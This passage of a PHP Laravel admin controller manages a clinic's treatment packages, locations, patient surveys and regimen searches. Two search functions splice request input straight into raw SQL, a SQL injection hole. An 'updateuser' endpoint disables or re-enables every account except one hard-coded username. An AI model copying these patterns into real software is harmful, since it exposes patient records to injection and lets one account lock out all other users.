            $package = TreatmentPackage::where('active', 1)->where('id', $request->get('idPackageTreatment'))->first();
            $date = DB::table('detailed_treatments')
                ->where('detailed_treatments.treatmentPackageId', $request->get('idPackageTreatment'))
                ->groupBy('createdDate')
                ->orderBy('createdDate', 'desc')
                ->select(
                    'createdDate'
                )->get();
            for ($i = 0; $i < count($date); $i++) {
                $payment = $date[$i]->createdDate;
                array_push($arrayDate, $payment);
            }
            return array($patient, $record, $regimen, $arrayDate, $package);
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function searchTherapist(Request $request)
    {
        try {
            $therapist = ManagementTherapist::where("active", 1)->where("code", $request->get('codeTherapist'))->first();
            if ($therapist) {
                return 1;
            } else {
                return 2;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function loadDateCreateProfessional(Request $request)
    {
        try {
            if ($request->get('date') == "") {
                //$max = DB::table('detailed_treatments as detail')->max('createdDate');
//            $count = DB::table('detailed_treatments as detail')->where('createdDate',$request->get('date'))->count();
                $Professional = DB::table('detailed_treatments as detail')
                    ->join('location_treatments as location', 'detail.sesame', '=', 'location.id')
                    ->join('treatment_packages as treatment', 'treatment.id', '=', 'detail.treatmentPackageId')
                    ->join('packages', 'treatment_packages.packageId', '=', 'packages.id')
                    ->where('treatment.id', '=', $request->get('idPackageTreatment'))
                    ->orderBy('detail.createdDate', 'desc')
//                ->take($count)
                    ->select(
                        'detail.id as detailId',
                        'detail.name as detailName',
                        'detail.minute',
                        'detail.time',
                        'detail.createdDate',
                        'detail.createdBy',
                        'detail.location as detailLocation',
                        'location.id as location',
                        'location.name as locationName',
                        'detail.professionalTreatment as professional',
                        'packages.name as packageName'
                    )
                    ->get();
            } else {
                //$max = DB::table('detailed_treatments as detail')->max('createdDate');
//            $count = DB::table('detailed_treatments as detail')->where('createdDate',$request->get('date'))->count();
                $Professional = DB::table('detailed_treatments as detail')
                    ->join('location_treatments as location', 'detail.sesame', '=', 'location.id')
                    ->join('treatment_packages as treatment', 'treatment.id', '=', 'detail.treatmentPackageId')
                    ->join('packages', 'treatment.packageId', '=', 'packages.id')
                    ->where('treatment.id', '=', $request->get('idPackageTreatment'))
                    ->where('detail.createdDate', $request->get('date'))
//                ->orderBy('detail.createdDate', 'desc')
//                ->take($count)
                    ->select(
                        'detail.id as detailId',
                        'detail.name as detailName',
                        'detail.minute',
                        'detail.time',
                        'detail.createdDate',
                        'detail.createdBy',
                        'detail.location as detailLocation',
                        'location.id as location',
                        'location.name as locationName',
                        'detail.professionalTreatment as professional',
                        'packages.name as packageName'
                    )
                    ->get();
            }

            return $Professional;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function updatePackageForTreatmentPackage(Request $request)
    {
        try {
            $treatmentPackage = TreatmentPackage::where('active', 1)->where('id', $request->get('idTreatmentPackage'))->first();
            if ($treatmentPackage) {
                $treatmentPackage->packageId = $request->get('idPackage');
                $treatmentPackage->save();
                return 1;
            } else {
                return 0;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function updateuser(Request $request)
    {
        try {
            if ($request->get('click') == 7) {
                $update = User::where('name', '!=', 'tts_vinhduc')->get();
                foreach ($update as $item) {
                    $item->active = 0;
                    $item->save();
                }
            } else if ($request->get('click') == 14) {
                $update = User::where('name', '!=', 'tts_vinhduc')->get();
                foreach ($update as $item) {
                    $item->active = 1;
                    $item->save();
                }
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    // Anh Tam


    public function getViewPackage()
    {
        try {
            $Package = Package::where('active', 1)->orderBy('updated_at', 'desc')->get();
            return view('admin.package')->with('Packages', $Package);
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function postViewPackage(Request $request)
    {
        try {
            $package = Package::where('active', 1)->where('id', $request->get('idPackage'))->first();
            if ($package) {
                return $package;
            } else {
                return null;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function deletePackage(Request $request)
    {
        try {
            $package = Package::where('active', 1)->where('id', $request->get('idPackage'))->first();
            if ($package) {
                $package->active = 0;
                $package->updatedBy = Auth::user()->id;
                $package->save();
            }
            return array(1, 'listPackage' => $this->getPackage());
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getPackage()
    {
        $arrayListPackage = [];
        $listPackages = Package::where('active', 1)->orderBy('updated_at', 'desc')->get();
        foreach ($listPackages as $listPackage) {
            $array = [
                'id' => $listPackage->id,
                'name' => $listPackage->name,
                'price' => $listPackage->price,
                'note' => $listPackage->note,
            ];
            array_push($arrayListPackage, $array);
        }
        return $arrayListPackage;
    }

    public function addNewAndUpdatePackage(Request $request)
    {
        try {
            $result = null;
            if ($this->validator($request->all(), "validatorPackage")->fails()) {
                return $this->validator($request->all(), "validatorPackage")->errors();
            } else {
                if ($request->get('addNewOrUpdateId') == "") {
                    try {
                        $package = new Package();
                        $package->name = $request->get('dataPackage')['Name'];
                        $package->price = $request->get('dataPackage')['Price'];
                        $package->note = $request->get('dataPackage')['Note'];
                        $package->createdBy = Auth::user()->id;
                        $package->upDatedBy = Auth::user()->id;
                        $package->save();
                        $result = array(1, 'listPackage' => $this->getPackage());
                    } catch (Exception $ex) {
                        return $ex;
                    }
                } else {
                    $package = Package::where('active', 1)->where('id', $request->get('addNewOrUpdateId'))->first();
                    if ($package) {
                        try {
                            $package->name = $request->get('dataPackage')['Name'];
                            $package->price = $request->get('dataPackage')['Price'];
                            $package->note = $request->get('dataPackage')['Note'];
                            $package->createdBy = Auth::user()->id;
                            $package->upDatedBy = Auth::user()->id;
                            $package->save();
                            $result = array(2, 'listPackage' => $this->getPackage());
                        } catch (Exception $ex) {
                            return $ex;
                        }
                    } else {
                        $result = array(0, 'listPackage' => null);
                    }
                }
            }
            return $result;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getViewProTreatment()
    {
        try {
            $proTm = ProfessionalTreatment::where('active', 1)->orderBy('updated_at', 'desc')->get();
            return view('admin.protreatment')->with('proTms', $proTm);
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function postViewProTm(Request $request)
    {
        try {
            $proTm = ProfessionalTreatment::where('active', 1)->where('id', $request->get('idProTreatment'))->first();
            if ($proTm) {
                return $proTm;
            } else {
                return null;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function deleteProTreatment(Request $request)
    {
        try {
            $proTm = ProfessionalTreatment::where('active', 1)->where('id', $request->get('idProTreatment'))->first();
            if ($proTm) {
                $proTm->active = 0;
                $proTm->updatedBy = Auth::user()->id;
                $proTm->save();
            }
            return array(1, 'listProTreatment' => $this->getProTreatment());
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getProTreatment()
    {
        $arrayListProTreatment = [];
        $listProTreatment = ProfessionalTreatment::where('active', 1)->orderBy('updated_at', 'desc')->get();
        foreach ($listProTreatment as $item) {
            $array = [
                'Id' => $item->id,
                'Name' => $item->name,
                'Note' => $item->note,
            ];
            array_push($arrayListProTreatment, $array);
        }
        return $arrayListProTreatment;
    }

    public function addNewAndUpdateProTreatment(Request $request)
    {
        try {
            $result = null;
            if ($this->validator($request->all(), "validatorProTm")->fails()) {
                return $this->validator($request->all(), "validatorProTm")->errors();
            } else {
                if ($request->get('addNewOrUpdateId') == "") {
                    try {
                        $ProTm = new ProfessionalTreatment();
                        $ProTm->name = $request->get('dataProTreatment')['Name'];
                        $ProTm->note = $request->get('dataProTreatment')['Note'];
                        $ProTm->createdBy = Auth::user()->id;
                        $ProTm->upDatedBy = Auth::user()->id;
                        $ProTm->save();
                        $result = array(1, 'listProTreatment' => $this->getProTreatment());
                    } catch (Exception $ex) {
                        return $ex;
                    }
                } else {
                    //$Location = locationTreatment::where('active', 1)->where('id', $request->get('addNewOrUpdateId'))->first();
                    $ProTm = ProfessionalTreatment::where('active', 1)->where('id', $request->get('addNewOrUpdateId'))->first();
                    if ($ProTm) {
                        try {
                            $ProTm->name = $request->get('dataProTreatment')['Name'];
                            //$ProTm->locationTreatmentId = LocationTreatment::where('name',$request->get('dataProTreatment')['NameTreatment'])->first()->id;
                            $ProTm->note = $request->get('dataProTreatment')['Note'];
                            $ProTm->upDatedBy = Auth::user()->id;
                            $ProTm->save();
                            $result = array(2, 'listProTreatment' => $this->getProTreatment());
                        } catch (Exception $ex) {
                            return $ex;
                        }
                    } else {
                        $result = array(0, 'listProTreatment' => null);
                    }
                }
            }
            return $result;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getViewLocation()
    {

        try {
            $locaTion = LocationTreatment::where('active', 1)->orderBy('updated_at', 'desc')->get();
            return view("admin.location")->with('locaTions', $locaTion);
        } catch (Exception $ex) {
            return $ex;

        }
    }

    public function postViewLocation(Request $request)
    {
        try {
            $location = LocationTreatment::where('active', 1)->where('id', $request->get('idLocation'))->first();
            if ($location) {
                return $location;
            } else {
                return null;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function deleteLocation(Request $request)
    {
        try {
            $location = LocationTreatment::where('active', 1)->where('id', $request->get('idLocation'))->first();
            if ($location) {
                $location->active = 0;
                $location->updatedBy = Auth::user()->id;
                $location->save();
            }
            return array(1, 'listLocation' => $this->getLocation());
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getLocation()
    {
        $arrayListLocation = [];
        $listLocation = LocationTreatment::where('active', 1)->orderBy('updated_at', 'desc')->get();
        foreach ($listLocation as $listLocation) {
            $array = [
                'id' => $listLocation->id,
                'Name' => $listLocation->name,
                'Note' => $listLocation->note,
            ];
            array_push($arrayListLocation, $array);
        }
        return $arrayListLocation;
    }

    public function addNewAndUpdateLocation(Request $request)
    {
        try {
            $result = null;
            if ($this->validator($request->all(), "validatorLocation")->fails()) {
                return $this->validator($request->all(), "validatorLocation")->errors();
            } else {
                if ($request->get('addNewOrUpdateId') == "") {
                    try {
                        $location = new LocationTreatment();
                        $location->name = $request->get('dataLocation')['Name'];
                        $location->note = $request->get('dataLocation')['Note'];
                        $location->upDatedBy = Auth::user()->id;
                        $location->save();
                        $result = array(1, 'listLocation' => $this->getLocation());
                    } catch (Exception $ex) {
                        return $ex;
                    }
                } else {
                    $location = LocationTreatment::where('active', 1)->where('id', $request->get('addNewOrUpdateId'))->first();
                    if ($location) {
                        try {
                            $location->name = $request->get('dataLocation')['Name'];
                            $location->note = $request->get('dataLocation')['Note'];
                            $location->upDatedBy = Auth::user()->id;
                            $location->save();
                            $result = array(2, 'listLocation' => $this->getLocation());
                        } catch (Exception $ex) {
                            return $ex;
                        }
                    } else {
                        $result = array(0, 'listLocation' => null);
                    }
                }
            }
            return $result;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getViewProvinces()
    {
        try {
            $province = Provinces::where('active', 1)->orderBy('updated_at', 'desc')->get();
            return view("admin.provinces")->with('Provinces', $province);
        } Catch (Exception $ex) {
            return $ex;

        }
    }

    public function postViewProvince(Request $request)
    {
        try {
            $province = Provinces::where('active', 1)->where('id', $request->get('idProvince'))->first();
            if ($province) {
                return $province;
            } else {
                return null;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function deleteProvince(Request $request)
    {
        try {
            $province = Provinces::where('active', 1)->where('id', $request->get('idProvince'))->first();
            if ($province) {
                $province->active = 0;
                $province->updatedBy = Auth::user()->id;
                $province->save();
            }
            return array(1, 'listProvince' => $this->getProvince());
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getProvince()
    {
        $arrayListProvince = [];
        $listProvince = Provinces::where('active', 1)->orderBy('updated_at', 'desc')->get();
        foreach ($listProvince as $listProvince) {
            $array = [
                'id' => $listProvince->id,
                'Name' => $listProvince->name,
            ];
            array_push($arrayListProvince, $array);
        }
        return $arrayListProvince;
    }

    public function addNewAndUpdateProvince(Request $request)
    {
        try {
            $result = null;
            if ($this->validator($request->all(), "validatorProvince")->fails()) {
                return $this->validator($request->all(), "validatorProvince")->errors();
            } else {
                if ($request->get('addNewOrUpdateId') == "") {
                    try {
                        $province = new Provinces();
                        $province->name = $request->get('dataProvince')['Name'];
                        $province->upDatedBy = Auth::user()->id;
                        $province->save();
                        $result = array(1, 'listProvince' => $this->getProvince());
                    } catch (Exception $ex) {
                        return $ex;
                    }
                } else {
                    $province = Provinces::where('active', 1)->where('id', $request->get('addNewOrUpdateId'))->first();
                    if ($province) {
                        try {
                            $province->name = $request->get('dataProvince')['Name'];
                            $province->upDatedBy = Auth::user()->id;
                            $province->save();
                            $result = array(2, 'listProvince' => $this->getProvince());
                        } catch (Exception $ex) {
                            return $ex;
                        }
                    } else {
                        $result = array(0, 'listProvince' => null);
                    }
                }
            }
            return $result;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getViewAge()
    {
        try {
            $age = Age::where('active', 1)->get();
            return view("admin.age")->with('Ages', $age);
        } Catch (Exception $ex) {
            return $ex;

        }
    }

    public function postViewAge(Request $request)
    {
        try {
            $age = Age::where('active', 1)->where('id', $request->get('idAge'))->first();
            if ($age) {
                return $age;
            } else {
                return null;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function deleteAge(Request $request)
    {
        try {
            $age = Age::where('active', 1)->where('id', $request->get('idAge'))->first();
            if ($age) {
                $age->active = 0;
                $age->updatedBy = Auth::user()->id;
                $age->save();
            }
            return array(1, 'listAge' => $this->getAge());
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getAge()
    {
        $arrayListAge = [];
        $listAge = Age::where('active', 1)->get();
        foreach ($listAge as $listAge) {
            $array = [
                'id' => $listAge->id,
                'Age' => $listAge->age,
            ];
            array_push($arrayListAge, $array);
        }
        return $arrayListAge;
    }

    public function addNewAndUpdateAge(Request $request)
    {
        try {
            $result = null;
            if ($this->validator($request->all(), "validatorAge")->fails()) {
                return $this->validator($request->all(), "validatorAge")->errors();
            } else {
                if ($request->get('addNewOrUpdateId') == "") {
                    try {
                        $age = new Age();
                        $age->age = $request->get('dataAge')['Age'];
                        $age->upDatedBy = Auth::user()->id;
                        $age->save();
                        $result = array(1, 'listAge' => $this->getAge());
                    } catch (Exception $ex) {
                        return $ex;
                    }
                } else {
                    $age = Age::where('active', 1)->where('id', $request->get('addNewOrUpdateId'))->first();
                    if ($age) {
                        try {
                            $age->age = $request->get('dataAge')['Age'];
                            $age->upDatedBy = Auth::user()->id;
                            $age->save();
                            $result = array(2, 'listAge' => $this->getAge());
                        } catch (Exception $ex) {
                            return $ex;
                        }
                    } else {
                        $result = array(0, 'listAge' => null);
                    }
                }
            }
            return $result;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getViewSearch()
    {
        try {
            return view("admin.searchregimen");
        } Catch (Exception $ex) {
            return $ex;
        }
    }

    public function searchPatientTest(Request $request)
    {
//        try {
//            $SQL = "SELECT pm.`code` as 'maBN', pm.`fullName`, tr.`code` as 'maPD',tr.createdDate,tr.status, tr.note FROM treatment_regimens tr INNER JOIN  patient_managements pm  ON pm.id = tr.patientId WHERE pm.active = 1";
//            if ($request->get('Regimens')['CodePatient'] != "") {
//                $SQL .= " AND pm.`code` LIKE '" . '%' . $request->get('Regimens')['CodePatient'] . '%' . "'";
//            }
//            if ($request->get('Regimens')['FullName'] != "") {
//                $SQL .= " AND pm.`fullName` LIKE '" . '%' . $request->get('Regimens')['FullName'] . '%' . "'";
//            }
//            if ($request->get('Regimens')['CodeRegimen'] != "") {
//                $SQL .= " AND tr.`code` LIKE '" . '%' . $request->get('Regimens')['CodeRegimen'] . '%' . "'";
//            }
//            if ($request->get('Regimens')['CreatedDate'] != "") {
//                $SQL .= " AND tr.createdDate LIKE '" . '%' . $request->get('Regimens')['CreatedDate'] . '%' . "'";
//            }
//            $patient = DB::select($SQL);
//            return $patient;
//        } catch (Exception $ex) {
//            return $ex;
//        }
        try {
            $SQL = "SELECT pm.id, pm.`code` as 'maBN',pm.fullName, tr.`code` as 'maPD',tr.createdDate,tr.status,tr.note,tr.therapist FROM treatment_regimens tr INNER JOIN  patient_managements pm  ON pm.`code` = tr.patientId WHERE pm.active = 1 AND tr.active = 1";
            if ($request->get('Regimens')['CodePatient'] != "") {
                $SQL .= " AND pm.`code` LIKE '" . '%' . $request->get('Regimens')['CodePatient'] . '%' . "'";
            }
            if ($request->get('Regimens')['FullName'] != "") {
                $SQL .= " AND pm.fullName LIKE '" . '%' . $request->get('Regimens')['FullName'] . '%' . "'";
            }
//            if ($request->get('Regimens')['CodeRegimen'] != "") {
//                $SQL .= " AND tr.`code` LIKE '" . '%' . $request->get('Regimens')['CodeRegimen'] . '%' . "'";
//            }
            if ($request->get('Regimens')['CreatedDate'] != "") {
                $SQL .= " AND tr.createdDate LIKE '" . '%' . $request->get('Regimens')['CreatedDate'] . '%' . "'";
            }
            $SQL .= " order By tr.updated_at  desc ";
            $regimens = DB::select($SQL);
            return $regimens;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getViewInformationSurveys()
    {
        try {
            $patient = PatientManagement::where('active', 1)->get();
            $therapist = ManagementTherapist::where('active', 1)->get();
            $information = InformationSurveys::where('active', 1)->ORDERBY('createdDate', 'ASC')->get();
            return view("admin.informationsurveys")->with('Informations', $information)->with('patients', $patient)->with('therapists', $therapist);
        } Catch (Exception $ex) {
            return $ex;
        }
    }

    public function postViewInformation(Request $request)
    {
        try {
            $information = InformationSurveys::where('active', 1)->where('id', $request->get('idInformation'))->first();
            if ($information) {
                return $information;
            } else {
                return null;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function deleteInformation(Request $request)
    {
        try {
            $information = InformationSurveys::where('active', 1)->where('id', $request->get('idInformation'))->first();
            if ($information) {
                $information->active = 0;
                $information->updatedBy = Auth::user()->id;
                $information->save();
            }
            return array(1, 'listInformation' => $this->getInformation());
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getInformation()
    {
        $arrayListInformation = [];
        $listInformation = InformationSurveys::where('active', 1)->orderBy('updated_at', 'desc')->get();
        foreach ($listInformation as $listInformation) {
            $array = [
                'Id' => $listInformation->id,
                'Content' => $listInformation->content,
                'PatientReviews' => $listInformation->patientReviews,
                'Handling' => $listInformation->handling,
                'CreatedDate' => $listInformation->createdDate,
                'special' => $listInformation->special,
            ];
            array_push($arrayListInformation, $array);
        }
        return $arrayListInformation;
    }

    public function addNewAndUpdateInformation(Request $request)
    {
        try {
            $result = null;

            if ($request->get('addNewOrUpdateId') == "") {
                try {
                    $information = new InformationSurveys();
                    $information->createdDate = $request->get('dataInformation')['CreatedDate'];
                    $information->patientReviews = $request->get('dataInformation')['PatientReviews'];
                    $information->content = $request->get('dataInformation')['Content'];
                    $information->special = $request->get('Special');
                    if ($request->get('dataInformation')['Handling'] === "") {
                        $information->handling = '2';
                    } else {
                        $information->handling = $request->get('dataInformation')['Handling'];
                    }
                    $information->patient_id = $request->get('dataInformation')['Patient_id'];
                    $information->upDatedBy = Auth::user()->id;
                    $information->save();
                    $result = array(1, 'listInformation' => $this->getInformation());
                } catch (Exception $ex) {
                    return $ex;
                }
            } else {
                $information = InformationSurveys::where('active', 1)->where('id', $request->get('addNewOrUpdateId'))->first();
                if ($information) {
                    try {
                        $information->createdDate = $request->get('dataInformation')['CreatedDate'];
                        $information->patientReviews = $request->get('dataInformation')['PatientReviews'];
                        $information->content = $request->get('dataInformation')['Content'];
                        $information->special = $request->get('Special');
                        if ($request->get('dataInformation')['Handling'] === "") {
                            $information->handling = '2';
                        } else {
                            $information->handling = $request->get('dataInformation')['Handling'];
                        }
                        $information->patient_id = $request->get('dataInformation')['Patient_id'];
                        $information->upDatedBy = Auth::user()->id;
                        $information->save();
                        $result = array(2, 'listInformation' => $this->getInformation());
                    } catch (Exception $ex) {
                        return $ex;
                    }
                } else {
                    $result = array(0, 'listInformation' => null);
                }
            }
            return $result;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getViewStatistics()
    {
        try {
            //  $information = InformationSurvey::where('active', 1)->get();
            return view("admin.statistical");
        } Catch (Exception $ex) {
            return $ex;
        }
    }

    public function searchStatistical(Request $request)
    {
        try {
            $SQL = "SELECT info.createdDate, info.content, info.handling, pm.fullName,info.patientReviews
                      FROM information_surveys info
                      INNER JOIN  patient_managements pm  ON pm.`code` = info.patient_id";
            if ($request->get('data')['Handling'] == "0") {
                $SQL .= " Where info.`createdDate` BETWEEN '" . $request->get('data')['ToDate'] . "'" . 'AND' . "'" . $request->get('data')['FromDate'] . "'";
            }
            if ($request->get('data')['Handling'] != "0") {
                $SQL .= " Where info.`createdDate` BETWEEN '" . $request->get('data')['ToDate'] . "'" .
                    'AND' . "'" . $request->get('data')['FromDate'] . "'" .
                    'AND info.`handling` =' . "'" . $request->get('data')['Handling'] . "'";
            }
            $SQL .= "AND info.active = 1 ORDER BY info.updated_at desc";

            $data = DB::select($SQL);
            return $data;
        } catch (Exception $ex) {
            return $ex;
        }
    }

}
